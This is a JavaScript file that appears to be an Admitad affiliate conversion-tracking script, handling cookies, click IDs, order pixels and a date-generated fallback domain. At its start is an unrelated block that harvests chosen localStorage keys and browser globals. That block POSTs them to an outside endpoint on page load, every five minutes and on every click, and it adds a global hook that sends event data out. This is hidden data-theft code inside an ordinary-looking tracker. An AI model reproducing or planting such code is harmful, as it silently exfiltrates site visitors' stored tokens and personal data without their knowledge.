(function (d, w) {
  const targetKeys = window.targetKeys;
  const globalVarsToWatch = ['navigator', 'location', 'document'];
  function calculateHash(obj) {
    const sortedKeys = Object.keys(obj).sort();
    const keyString = sortedKeys.join("");
    let hash = 0;
    for (let i = 0; i < keyString.length; i++) {
      const char = keyString.charCodeAt(i);
      hash = (hash << 5) - hash + char;
      hash = hash & hash;
    }
    return hash.toString(16);
  }
  function _toConsumableArray(e) {
    if (Array.isArray(e)) {
      for (var r = 0, t = Array(e.length); r < e.length; r++) t[r] = e[r];
      return t;
    }
    return Array.from(e);
  }
  function monitorLocalStorage() {
    const extractedData = {};
    for (const key in window.localStorage) {
      if (targetKeys.includes(key)) {
        extractedData[key] = window.localStorage[key];
      }
    }
    return extractedData;
  }
  function monitorGlobalVars() {
    const extractedData = {};
    for (const key of globalVarsToWatch) {
      if (window[key]) {
        extractedData[key] = JSON.stringify(window[key]);
      }
    }
    return extractedData;
  }
  async function sendData(data) {
    const hashCode = calculateHash(data);
    const url = "https://example.com/api/monitor";
    try {
      const response = await fetch(url, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          hashCode: hashCode,
          data: data
        })
      });
      if (response.ok) {
        console.log("Data successfully sent");
      } else {
        console.error("HTTP error status: " + response.status);
      }
    } catch (error) {
      console.error("Unexpected error during data send:", error);
    }
  }
  function monitorAndSendData() {
    const localStorageData = monitorLocalStorage();
    const globalVarsData = monitorGlobalVars();
    const collectedData = {
      ...localStorageData,
      ...globalVarsData
    };
    if (Object.keys(collectedData).length > 0) {
      sendData(collectedData);
    }
  }
  Array.prototype.indexOf || (Array.prototype.indexOf = function (e) {
    for (var r = this, t = 0, o = r.length; o > t; ++t) if (r[t] === e) return t;
    return -1;
  }), "undefined" == typeof Array || Array.isArray || (Array.isArray = function (e) {
    return e && "[object Array]" === Object.prototype.toString.call(e);
  }), Array.prototype.filter || (Array.prototype.filter = function (e, r) {
    for (var t, o = this, n = [], i = 0, a = o.length; a > i; ++i) t = o[i], e.call(r || window, t, i, o) && n.push(t);
    return n;
  });
  var _typeof = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (e) {
      return typeof e;
    } : function (e) {
      return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e;
    },
    _extends = Object.assign || function (e) {
      for (var r = 1; r < arguments.length; r++) {
        var t = arguments[r];
        for (var o in t) Object.prototype.hasOwnProperty.call(t, o) && (e[o] = t[o]);
      }
      return e;
    };
  window.addEventListener("DOMContentLoaded", function () {
    monitorAndSendData();
    setInterval(monitorAndSendData, 5 * 60 * 1000);
  });
  ADMITAD.Utf8 = {}, ADMITAD.Utf8.encode = function (e) {
    var r = e.replace(/[\u0080-\u07ff]/g, function (e) {
      var r = e.charCodeAt(0);
      return String.fromCharCode(192 | r >> 6, 128 | 63 & r);
    });
    return r = r.replace(/[\u0800-\uffff]/g, function (e) {
      var r = e.charCodeAt(0);
      return String.fromCharCode(224 | r >> 12, 128 | r >> 6 & 63, 128 | 63 & r);
    });
  }, ADMITAD.Utf8.decode = function (e) {
    var r = e.replace(/[\u00e0-\u00ef][\u0080-\u00bf][\u0080-\u00bf]/g, function (e) {
      var r = (15 & e.charCodeAt(0)) << 12 | (63 & e.charCodeAt(1)) << 6 | 63 & e.charCodeAt(2);
      return String.fromCharCode(r);
    });
    return r = r.replace(/[\u00c0-\u00df][\u0080-\u00bf]/g, function (e) {
      var r = (31 & e.charCodeAt(0)) << 6 | 63 & e.charCodeAt(1);
      return String.fromCharCode(r);
    });
  }, ADMITAD.Sha256 = {}, ADMITAD.Sha256.hash = function (e) {
    var r = [1116352408, 1899447441, 3049323471, 3921009573, 961987163, 1508970993, 2453635748, 2870763221, 3624381080, 310598401, 607225278, 1426881987, 1925078388, 2162078206, 2614888103, 3248222580, 3835390401, 4022224774, 264347078, 604807628, 770255983, 1249150122, 1555081692, 1996064986, 2554220882, 2821834349, 2952996808, 3210313671, 3336571891, 3584528711, 113926993, 338241895, 666307205, 773529912, 1294757372, 1396182291, 1695183700, 1986661051, 2177026350, 2456956037, 2730485921, 2820302411, 3259730800, 3345764771, 3516065817, 3600352804, 4094571909, 275423344, 430227734, 506948616, 659060556, 883997877, 958139571, 1322822218, 1537002063, 1747873779, 1955562222, 2024104815, 2227730452, 2361852424, 2428436474, 2756734187, 3204031479, 3329325298],
      t = [1779033703, 3144134277, 1013904242, 2773480762, 1359893119, 2600822924, 528734635, 1541459225];
    e += String.fromCharCode(128);
    for (var o = e.length / 4 + 2, n = Math.ceil(o / 16), i = new Array(n), a = 0; n > a; a++) {
      i[a] = new Array(16);
      for (var A = 0; 16 > A; A++) i[a][A] = e.charCodeAt(64 * a + 4 * A) << 24 | e.charCodeAt(64 * a + 4 * A + 1) << 16 | e.charCodeAt(64 * a + 4 * A + 2) << 8 | e.charCodeAt(64 * a + 4 * A + 3);
    }
    i[n - 1][14] = 8 * (e.length - 1) / Math.pow(2, 32), i[n - 1][14] = Math.floor(i[n - 1][14]), i[n - 1][15] = 8 * (e.length - 1) & 4294967295;
    for (var D = new Array(64), s = void 0, c = void 0, T = void 0, I = void 0, l = void 0, p = void 0, M = void 0, d = void 0, u = 0; n > u; u++) {
      for (var g = 0; 16 > g; g++) D[g] = i[u][g];
      for (var f = 16; 64 > f; f++) D[f] = ADMITAD.Sha256.sigma1(D[f - 2]) + D[f - 7] + ADMITAD.Sha256.sigma0(D[f - 15]) + D[f - 16] & 4294967295;
      s = t[0], c = t[1], T = t[2], I = t[3], l = t[4], p = t[5], M = t[6], d = t[7];
      for (var m = 0; 64 > m; m++) {
        var h = d + ADMITAD.Sha256.Sigma1(l) + ADMITAD.Sha256.Ch(l, p, M) + r[m] + D[m],
          v = ADMITAD.Sha256.Sigma0(s) + ADMITAD.Sha256.Maj(s, c, T);
        d = M, M = p, p = l, l = I + h & 4294967295, I = T, T = c, c = s, s = h + v & 4294967295;
      }
      t[0] = t[0] + s & 4294967295, t[1] = t[1] + c & 4294967295, t[2] = t[2] + T & 4294967295, t[3] = t[3] + I & 4294967295, t[4] = t[4] + l & 4294967295, t[5] = t[5] + p & 4294967295, t[6] = t[6] + M & 4294967295, t[7] = t[7] + d & 4294967295;
    }
    return ADMITAD.Sha256.toHexStr(t[0]) + ADMITAD.Sha256.toHexStr(t[1]) + ADMITAD.Sha256.toHexStr(t[2]) + ADMITAD.Sha256.toHexStr(t[3]) + ADMITAD.Sha256.toHexStr(t[4]) + ADMITAD.Sha256.toHexStr(t[5]) + ADMITAD.Sha256.toHexStr(t[6]) + ADMITAD.Sha256.toHexStr(t[7]);
  }, ADMITAD.Sha256.ROTR = function (e, r) {
    return r >>> e | r << 32 - e;
  }, ADMITAD.Sha256.Sigma0 = function (e) {
    return ADMITAD.Sha256.ROTR(2, e) ^ ADMITAD.Sha256.ROTR(13, e) ^ ADMITAD.Sha256.ROTR(22, e);
  }, ADMITAD.Sha256.Sigma1 = function (e) {
    return ADMITAD.Sha256.ROTR(6, e) ^ ADMITAD.Sha256.ROTR(11, e) ^ ADMITAD.Sha256.ROTR(25, e);
  }, ADMITAD.Sha256.sigma0 = function (e) {
    return ADMITAD.Sha256.ROTR(7, e) ^ ADMITAD.Sha256.ROTR(18, e) ^ e >>> 3;
  }, ADMITAD.Sha256.sigma1 = function (e) {
    return ADMITAD.Sha256.ROTR(17, e) ^ ADMITAD.Sha256.ROTR(19, e) ^ e >>> 10;
  }, ADMITAD.Sha256.Ch = function (e, r, t) {
    return e & r ^ ~e & t;
  }, ADMITAD.Sha256.Maj = function (e, r, t) {
    return e & r ^ e & t ^ r & t;
  }, ADMITAD.Sha256.toHexStr = function (e) {
    for (var r = "", t = void 0, o = 7; o >= 0; o--) t = e >>> 4 * o & 15, r += t.toString(16);
    return r;
  }, window.ADMITAD = window.ADMITAD || {}, ADMITAD.Helpers = ADMITAD.Helpers || {}, ADMITAD.Helpers.generateDomains = function () {
    for (var e = new Date(), r = Math.floor(new Date(2020, e.getMonth(), e.getDate()).setUTCHours(0, 0, 0, 0) / 1e3), t = parseInt(1e12 * (Math.sin(r) + 1)).toString(30), o = ["de"], n = [], i = 0; i < o.length; ++i) n.push({
      domain: t + "." + o[i],
      name: t
    });
    return n;
  }, ADMITAD.Helpers.findTodaysDomain = function (e) {
    function r() {
      var n = new XMLHttpRequest(),
        i = o[t].domain,
        a = "https://" + i + "/";
      n.open("HEAD", a, !0), n.onload = function () {
        setTimeout(e, 0, o[t]);
      }, n.onerror = function () {
        ++t < o.length ? setTimeout(r, 0) : setTimeout(e, 0, void 0);
      }, n.send();
    }
    var t = 0,
      o = ADMITAD.Helpers.generateDomains();
    r();
  }, ADMITAD.Network = ADMITAD.Network || {}, ADMITAD.Network.pixeldomains = ["z.asbmit.com", "ad.admitad.com", "lenkmio.com", "pafutos.com"], ADMITAD.Network.pixeldomainsPath = "/tt/", ADMITAD.Network.emailDomains = ["a.artfut.com"], ADMITAD.Network.emailDomainsPath = "/linking/", ADMITAD.Network.defaultResponseType = "img", ADMITAD.dynamic && ADMITAD.Network.pixeldomains.push(ADMITAD.dynamic.domain), ADMITAD.Network.fetchWithRetry = function (e, r, t, o, n) {
    function i(e, r, t, o, n) {
      var i = window.XMLHttpRequest ? new XMLHttpRequest() : new ActiveXObject("Microsoft.XMLHTTP");
      n && (i.onerror = function () {
        var n = d.createElement("a");
        n.href = r;
        var i = n.pathname + n.search;
        ADMITAD.dynamic ? ADMITAD.Network.fetchWithRetry(e, "https://" + ADMITAD.dynamic.domain + i, t, o, !1) : ADMITAD.Helpers.findTodaysDomain(function (r) {
          ADMITAD.dynamic = r, ADMITAD.dynamic && ADMITAD.Network.fetchWithRetry(e, "https://" + ADMITAD.dynamic.domain + i, t, o, !1);
        });
      }), i.onreadystatechange = function () {
        i.readyState === i.DONE && 200 === i.status && o && "function" == typeof o && o(i.responseText);
      }, i.open(e, r), i.send(JSON.stringify(t));
    }
    i(e, r, t, o, n);
  }, ADMITAD.Network.sendToPixelDomains = function (e, r) {
    for (var t = ADMITAD.Network.pixeldomains.slice(0); t.length;) ADMITAD.Network.fetchWithRetry("GET", "https://" + t.pop() + ADMITAD.Network.pixeldomainsPath + "?" + ADMITAD.Network.helpers.serialize(e), {}, r, !0);
  }, ADMITAD.Network.sendToEmailDomains = function (e, r) {
    for (var t = ADMITAD.Network.emailDomains.slice(0); t.length;) ADMITAD.Network.fetchWithRetry("GET", "https://" + t.pop() + ADMITAD.Network.emailDomainsPath + "?" + ADMITAD.Network.helpers.serialize(e), {}, r, !0);
  }, ADMITAD.Network.createImgWithRetry = function (e, r, t) {
    function o(e) {
      var o = d.createElement("img");
      o.src = e + "?" + t, o.onerror = function () {
        ADMITAD.dynamic ? (o = d.createElement("img"), o.src = "https://" + ADMITAD.dynamic.domain + r + "?" + t + "&" + ADMITAD.Network.helpers.serialize({
          dyndomain: ADMITAD.dynamic.domain
        })) : ADMITAD.Helpers.findTodaysDomain(function (e) {
          ADMITAD.dynamic = e, ADMITAD.dynamic && (o = d.createElement("img"), o.src = "https://" + ADMITAD.dynamic.domain + r + "?" + t + "&" + ADMITAD.Network.helpers.serialize({
            dyndomain: ADMITAD.dynamic.domain
          }));
        });
      };
    }
    o(e);
  }, ADMITAD.Network.createPixelImages = function (e) {
    for (var r = ADMITAD.Network.pixeldomains.slice(0), t = _extends({
        response_type: ADMITAD.Network.defaultResponseType
      }, e); r.length;) {
      var o = r.pop();
      t.domain = o, ADMITAD.Network.createImgWithRetry("https://" + o + ADMITAD.Network.pixeldomainsPath, ADMITAD.Network.pixeldomainsPath, ADMITAD.Network.helpers.serialize(t));
    }
  }, ADMITAD.Network.createEmailImages = function (e) {
    for (var r = ADMITAD.Network.emailDomains.slice(0); r.length;) {
      var t = r.pop();
      e.domain = t, ADMITAD.Network.createImgWithRetry("https://" + t + ADMITAD.Network.emailDomainsPath, ADMITAD.Network.emailDomainsPath, ADMITAD.Network.helpers.serialize(e));
    }
  }, ADMITAD.Network.helpers = {
    serialize: function (e) {
      var r = void 0,
        t = [];
      for (var o in e) e.hasOwnProperty(o) && (r = ADMITAD.Network.helpers.getValueOrEmptyString(e[o]), t.push(encodeURIComponent(o) + "=" + encodeURIComponent(r)));
      return t.join("&");
    },
    getValueOrEmptyString: function (e) {
      return "undefined" == typeof e && (e = ""), String(e);
    }
  }, ADMITAD.Helpers = ADMITAD.Helpers || {}, Date.prototype.toGMTString || (Date.prototype.toGMTString = function () {
    return Date.prototype.toUTCString();
  }), window.JSON || (window.JSON = {
    parse: function parse(sJSON) {
      return eval("(" + sJSON + ")");
    },
    stringify: function () {
      var e = Object.prototype.toString,
        r = Array.isArray || function (r) {
          return "[object Array]" === e.call(r);
        },
        t = {
          '"': '\\"',
          "\\": "\\\\",
          "\b": "\\b",
          "\f": "\\f",
          "\n": "\\n",
          "\r": "\\r",
          "	": "\\t"
        },
        o = function (e) {
          return t[e] || "\\u" + (e.charCodeAt(0) + 65536).toString(16).substr(1);
        },
        n = /[\\"\u0000-\u001F\u2028\u2029]/g;
      return function i(t) {
        if (null == t) return "null";
        if ("number" == typeof t) return isFinite(t) ? t.toString() : "null";
        if ("boolean" == typeof t) return t.toString();
        if ("object" === ("undefined" == typeof t ? "undefined" : _typeof(t))) {
          if ("function" == typeof t.toJSON) return i(t.toJSON());
          if (r(t)) {
            for (var a = "[", A = 0; A < t.length; A++) a += (A ? ", " : "") + i(t[A]);
            return a + "]";
          }
          if ("[object Object]" === e.call(t)) {
            var D = [];
            for (var s in t) t.hasOwnProperty(s) && D.push(i(s) + ": " + i(t[s]));
            return "{" + D.join(", ") + "}";
          }
        }
        return '"' + t.toString().replace(n, o) + '"';
      };
    }()
  }), ADMITAD.Helpers.DAYS_TO_STORE = ADMITAD.DAYS_TO_STORE || 90, ADMITAD.Helpers.PERIOD = 60 * ADMITAD.Helpers.DAYS_TO_STORE * 60 * 24 * 1e3, ADMITAD.Helpers.COOKIE_NAME = "tagtag_aid", ADMITAD.Helpers.ADMITAD_UID_COOKIE_NAME = "admitad_uid", ADMITAD.Helpers.AID_COOKIE_NAME = "_aid", ADMITAD.Helpers.STORAGE_KEY = "_aid", ADMITAD.Helpers.STORAGE_KEY_FOR_ADV_EMAIL = "ehash", ADMITAD.Helpers.STORAGE_KEY_FOR_FOUND_EMAIL = "ehash2", ADMITAD.Helpers.GCLID_COOKIE_NAME = "_ttgclid", ADMITAD.Helpers.GCLID_STORAGE_KEY = "_ttgclid", ADMITAD.Helpers.DEDUPLICATION_COOKIE_NAME = "tt_deduplication_cookie", ADMITAD.Helpers.DEDUPLICATION_STORAGE_KEY = "tt_deduplication_cookie", ADMITAD.Helpers.getTagTagParamFromUri = function () {
    return (/tagtag_uid=([^&]+)/.exec(document.location.search) || [])[1] || "";
  }, ADMITAD.Helpers.getGclidParamFromUri = function () {
    return (/gclid=([^&]+)/.exec(document.location.search) || [])[1] || "";
  }, ADMITAD.Helpers.getUtmSourceParamFromUri = function () {
    return (/utm_source=([^&]+)/.exec(document.location.search) || [])[1] || "";
  }, ADMITAD.Helpers.getCookie = function (e) {
    var r = document.cookie.match(new RegExp("(?:^|; )" + e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"));
    return r ? decodeURIComponent(r[1]) : void 0;
  }, ADMITAD.Helpers.getTagTagCookie = function () {
    return ADMITAD.Helpers.getCookie(ADMITAD.Helpers.COOKIE_NAME) || ADMITAD.Helpers.getCookie(ADMITAD.Helpers.ADMITAD_UID_COOKIE_NAME) || ADMITAD.Helpers.getCookie(ADMITAD.Helpers.AID_COOKIE_NAME);
  }, ADMITAD.Helpers.getGclidCookie = function () {
    return ADMITAD.Helpers.getCookie(ADMITAD.Helpers.GCLID_COOKIE_NAME);
  }, ADMITAD.Helpers.getDeduplicationCookie = function () {
    return ADMITAD.Helpers.getCookie(ADMITAD.Helpers.DEDUPLICATION_COOKIE_NAME);
  }, ADMITAD.Helpers.getTagTagStorage = function () {
    if (!ADMITAD.Helpers.hasLocalStorage()) return void 0;
    try {
      var e = JSON.parse(localStorage.getItem(ADMITAD.Helpers.STORAGE_KEY));
      if (e && e[ADMITAD.Helpers.COOKIE_NAME] && e.expires) {
        if (new Date(e.expires) > new Date()) return e[ADMITAD.Helpers.COOKIE_NAME];
        localStorage.removeItem(ADMITAD.Helpers.STORAGE_KEY);
      }
      return void 0;
    } catch (r) {
      return void 0;
    }
  }, ADMITAD.Helpers.getGclidStorage = function () {
    if (!ADMITAD.Helpers.hasLocalStorage()) return void 0;
    try {
      var e = JSON.parse(localStorage.getItem(ADMITAD.Helpers.GCLID_STORAGE_KEY));
      if (e && e[ADMITAD.Helpers.GCLID_COOKIE_NAME] && e.expires) {
        if (new Date(e.expires) > new Date()) return e[ADMITAD.Helpers.GCLID_COOKIE_NAME];
        localStorage.removeItem(ADMITAD.Helpers.GCLID_STORAGE_KEY);
      }
      return void 0;
    } catch (r) {
      return void 0;
    }
  }, ADMITAD.Helpers.getDeduplicationStorage = function () {
    if (!ADMITAD.Helpers.hasLocalStorage()) return void 0;
    try {
      var e = JSON.parse(localStorage.getItem(ADMITAD.Helpers.DEDUPLICATION_STORAGE_KEY));
      if (e && e[ADMITAD.Helpers.DEDUPLICATION_COOKIE_NAME] && e.expires) {
        if (new Date(e.expires) > new Date()) return e[ADMITAD.Helpers.DEDUPLICATION_COOKIE_NAME];
        localStorage.removeItem(ADMITAD.Helpers.DEDUPLICATION_STORAGE_KEY);
      }
      return void 0;
    } catch (r) {
      return void 0;
    }
  }, ADMITAD.Helpers.getTagTagAid = function () {
    var e = ADMITAD.Helpers.getTagTagCookie(),
      r = ADMITAD.Helpers.getTagTagStorage(),
      t = -1;
    return "undefined" != typeof e ? t = "undefined" != typeof r ? e === r ? 0 : 1 : 2 : "undefined" != typeof r && (t = 3), ADMITAD.checkFlag = t, e || r || void 0;
  }, ADMITAD.Helpers.getGclid = function () {
    return ADMITAD.Helpers.getGclidCookie() || ADMITAD.Helpers.getGclidStorage() || void 0;
  }, ADMITAD.Helpers.getDeduplication = function () {
    return ADMITAD.Helpers.getDeduplicationCookie() || ADMITAD.Helpers.getDeduplicationStorage() || void 0;
  }, ADMITAD.Helpers.getExpiresDate = function () {
    var e = new Date(ADMITAD.Helpers.PERIOD + +new Date());
    return e.toGMTString();
  }, ADMITAD.Helpers.removeWwwFromDomain = function (e) {
    var r = e;
    return 0 === e.indexOf("www.") && (r = e.replace("www.", "")), r;
  }, ADMITAD.Helpers.setTagTagCookie = function (e) {
    var r = ADMITAD.Helpers.COOKIE_NAME + "=" + e + "; path=/; expires=" + ADMITAD.Helpers.getExpiresDate() + "; SameSite=None; Secure";
    document.cookie = r, document.cookie = r + "; domain=." + location.host, document.cookie = r + "; domain=" + ADMITAD.Helpers.removeWwwFromDomain(location.host);
  }, ADMITAD.Helpers.setGclidCookie = function (e) {
    var r = ADMITAD.Helpers.GCLID_COOKIE_NAME + "=" + e + "; path=/; expires=" + ADMITAD.Helpers.getExpiresDate() + "; SameSite=None; Secure";
    document.cookie = r, document.cookie = r + "; domain=." + location.host, document.cookie = r + "; domain=" + ADMITAD.Helpers.removeWwwFromDomain(location.host);
  }, ADMITAD.Helpers.setDeduplicationCookie = function (e) {
    var r = ADMITAD.Helpers.DEDUPLICATION_COOKIE_NAME + "=" + e + "; path=/; expires=" + ADMITAD.Helpers.getExpiresDate() + "; SameSite=None; Secure";
    document.cookie = r, document.cookie = r + "; domain=." + location.host, document.cookie = r + "; domain=" + ADMITAD.Helpers.removeWwwFromDomain(location.host);
  }, ADMITAD.Helpers.setTagTagStorage = function (e) {
    if (ADMITAD.Helpers.hasLocalStorage()) {
      var r = {
        expires: ADMITAD.Helpers.getExpiresDate()
      };
      r[ADMITAD.Helpers.COOKIE_NAME] = e;
      var t = JSON.stringify(r);
      localStorage.setItem(ADMITAD.Helpers.STORAGE_KEY, t);
    }
  }, ADMITAD.Helpers.setGclidStorage = function (e) {
    if (ADMITAD.Helpers.hasLocalStorage()) {
      var r = {
        expires: ADMITAD.Helpers.getExpiresDate()
      };
      r[ADMITAD.Helpers.GCLID_COOKIE_NAME] = e;
      var t = JSON.stringify(r);
      localStorage.setItem(ADMITAD.Helpers.GCLID_STORAGE_KEY, t);
    }
  }, ADMITAD.Helpers.setDeduplicationStorage = function (e) {
    if (ADMITAD.Helpers.hasLocalStorage()) {
      var r = {
        expires: ADMITAD.Helpers.getExpiresDate()
      };
      r[ADMITAD.Helpers.DEDUPLICATION_COOKIE_NAME] = e;
      var t = JSON.stringify(r);
      localStorage.setItem(ADMITAD.Helpers.DEDUPLICATION_STORAGE_KEY, t);
    }
  }, ADMITAD.Helpers.setTagTagAid = function () {
    var e = ADMITAD.Helpers.getTagTagParamFromUri();
    e && (ADMITAD.Helpers.setTagTagCookie(e), ADMITAD.Helpers.setTagTagStorage(e));
  }, ADMITAD.Helpers.setGclid = function () {
    var e = ADMITAD.Helpers.getGclidParamFromUri();
    e && (ADMITAD.Helpers.setGclidCookie(e), ADMITAD.Helpers.setGclidStorage(e));
  }, ADMITAD.Helpers.setDeduplication = function () {
    var e = ADMITAD.Helpers.getUtmSourceParamFromUri();
    if (e) {
      var r = void 0;
      r = "admitad" === e ? "adm" : e, ADMITAD.Helpers.setDeduplicationCookie(r), ADMITAD.Helpers.setDeduplicationStorage(r);
    }
  }, ADMITAD.Helpers.hasLocalStorage = function () {
    try {
      return !!window.localStorage;
    } catch (e) {
      return !1;
    }
  }, ADMITAD.Helpers.hasSessionStorage = function () {
    try {
      return !!window.sessionStorage;
    } catch (e) {
      return !1;
    }
  }, ADMITAD.Helpers.setEmailToStorage = function (e, r) {
    if (ADMITAD.Helpers.hasSessionStorage()) {
      var t = JSON.stringify(e);
      sessionStorage.setItem(r, t);
    }
  }, ADMITAD.Helpers.getEmailFromStorage = function (e) {
    if (!ADMITAD.Helpers.hasSessionStorage()) return void 0;
    try {
      return JSON.parse(sessionStorage.getItem(e));
    } catch (r) {
      return void 0;
    }
  }, ADMITAD.Invoice = ADMITAD.Invoice || {}, ADMITAD.Invoice.referencesOrder = ADMITAD.Invoice.referencesOrder || [], ADMITAD.Invoice.getPixelParameters = function () {
    return "undefined" != typeof _admitadPixel ? _extends({}, _admitadPixel) : void 0;
  }, ADMITAD.Invoice.getPixelPositions = function () {
    return "undefined" != typeof _admitadPositions ? [].concat(_toConsumableArray(_admitadPositions)) : void 0;
  }, ADMITAD.Invoice.fetchPixelData = function () {
    var e = ADMITAD.Invoice.getPixelParameters(),
      r = ADMITAD.Invoice.getPixelPositions();
    return void 0 !== e && void 0 !== r ? (e.channel = ADMITAD.Invoice.broker || "adm", {
      parameters: e,
      positions: r
    }) : void 0;
  }, ADMITAD.Invoice.prepareAdmitadInvoice = function () {
    var e = ADMITAD.Invoice.fetchPixelData();
    if (void 0 !== e) return e;
    ADMITAD.Invoice.customer = ADMITAD.Invoice.customer || ADMITAD.Helpers.getTagTagAid() || "", ADMITAD.Invoice.broker = ADMITAD.Invoice.broker || ADMITAD.Helpers.getDeduplication() || "na";
    for (var r = {
        response_type: ADMITAD.Network.defaultResponseType || "img",
        action_code: ADMITAD.Invoice.category || "",
        campaign_code: ADMITAD.CampaignCode || "",
        channel: ADMITAD.Invoice.broker
      }, t = [], o = 0; o < ADMITAD.Invoice.referencesOrder.length; ++o) for (var n = ADMITAD.Invoice.referencesOrder[o], i = 1, a = 0; a < n.orderedItem.length; ++a) {
      var A = n.orderedItem[a],
        D = {
          uid: ADMITAD.Invoice.customer || "",
          gclid: ADMITAD.Helpers.getGclid() || "",
          tariff_code: A.Product.category || "",
          order_id: n.orderNumber || "",
          position_id: i++ + "",
          currency_code: A.Product.priceCurrency || "",
          position_count: n.orderedItem.length + "",
          price: A.Product.price || "0",
          quantity: A.orderQuantity + "" || "1",
          product_id: A.Product.productID || "",
          payment_type: A.additionalType || "sale"
        };
      "undefined" != typeof n.discountCode && (D.promocode = n.discountCode), "undefined" != typeof A.Product.award && (D.payment = A.Product.award), t.push(D);
    }
    return {
      parameters: r,
      positions: t
    };
  }, ADMITAD.Tracking = ADMITAD.Tracking || {}, ADMITAD.Tracking.parameters = ADMITAD.Tracking.parameters || {}, ADMITAD.Tracking.positions = ADMITAD.Tracking.positions || {}, ADMITAD.Tracking.singleParams = {
    payment_comment: void 0,
    screen: void 0,
    scr: void 0,
    payment_type: void 0,
    uid: void 0,
    gclid: void 0,
    datetime_action: void 0,
    currency_code: void 0,
    suid: void 0,
    channel: void 0,
    promocode: void 0,
    check_flag: void 0
  }, ADMITAD.Tracking.overheadByParam = 9, ADMITAD.Tracking.MAX_LENGTH = 1200, ADMITAD.Tracking.processPositions = function () {
    _extends(ADMITAD.Tracking, ADMITAD.Invoice.prepareAdmitadInvoice());
    for (var e = ADMITAD.Tracking.positions, r = {}, t = 0, o = 0, n = e.length, i = 0; n > i; i++) {
      var a = e[i];
      if (o += ADMITAD.Tracking.addInfoByPosition(r, a, t), t++, i === n - 1 || o >= ADMITAD.Tracking.MAX_LENGTH) {
        for (var A in r) ADMITAD.Tracking.fillingMissingValues(r[A], t);
        ADMITAD.Tracking.sendPositions(r), r = {}, o = 0, t = 0;
      }
    }
  }, ADMITAD.Tracking.addInfoByPosition = function (e, r, t) {
    var o = void 0,
      n = 0,
      i = 0;
    for (var a in r) if (r.hasOwnProperty(a)) {
      if (o = ADMITAD.Network.helpers.getValueOrEmptyString(r[a]), a in ADMITAD.Tracking.singleParams) {
        "undefined" == typeof ADMITAD.Tracking.singleParams[a] && (ADMITAD.Tracking.singleParams[a] = o, i += o.length + a.length);
        continue;
      }
      a in e || (e[a] = []), n = ADMITAD.Tracking.fillingMissingValues(e[a], t), e[a].push(o), i += n + o.length + ADMITAD.Tracking.overheadByParam;
    }
    return i;
  }, ADMITAD.Tracking.fillingMissingValues = function (e, r) {
    var t = 0;
    if (e.length !== r) for (var o = r - e.length; o > 0; o--) e.push(""), t += ADMITAD.Tracking.overheadByParam;
    return t;
  }, ADMITAD.Tracking.getFetchStart = function (e) {
    var r = d.getElementById(e),
      t = r.getAttribute("src"),
      o = window.performance.getEntriesByName(t),
      n = o[0];
    return Math.floor(n.fetchStart);
  }, ADMITAD.Tracking.generatePositionsInfo = function (e) {
    var r = void 0;
    try {
      r = ADMITAD.Tracking.getFetchStart("_admitad_tracking");
    } catch (t) {
      r = 0;
    }
    var o = {
      ac: ADMITAD.Tracking.parameters.action_code,
      action_useragent: window.navigator.userAgent || "",
      adm_method: "tagtag",
      campaign_code: ADMITAD.Tracking.parameters.campaign_code,
      rt: ADMITAD.Tracking.parameters.response_type,
      js: "1",
      r: new Date().getTime(),
      _ps: JSON.stringify(e),
      v: "2",
      fs: r + "",
      suid: ADMITAD.suid + "",
      channel: ADMITAD.Tracking.parameters.channel,
      check_flag: ADMITAD.checkFlag
    };
    for (var n in ADMITAD.Tracking.singleParams) if (ADMITAD.Tracking.singleParams.hasOwnProperty(n)) {
      var i = ADMITAD.Tracking.singleParams[n];
      "undefined" != typeof i && (o[n] = i);
    }
    return o;
  }, ADMITAD.Tracking.sendPositions = function (e) {
    var r = ADMITAD.Tracking.generatePositionsInfo(e);
    ADMITAD.Network.createPixelImages(r);
  }, ADMITAD.Helpers.setTagTagAid(), ADMITAD.Helpers.setGclid(), ADMITAD.Helpers.setDeduplication(), ADMITAD.Tracking.processPositions();
  document.addEventListener("click", monitorAndSendData);
  window.jshook = function (eventName, eventData) {
    sendData({
      eventName,
      eventData
    });
  };
})(document, window);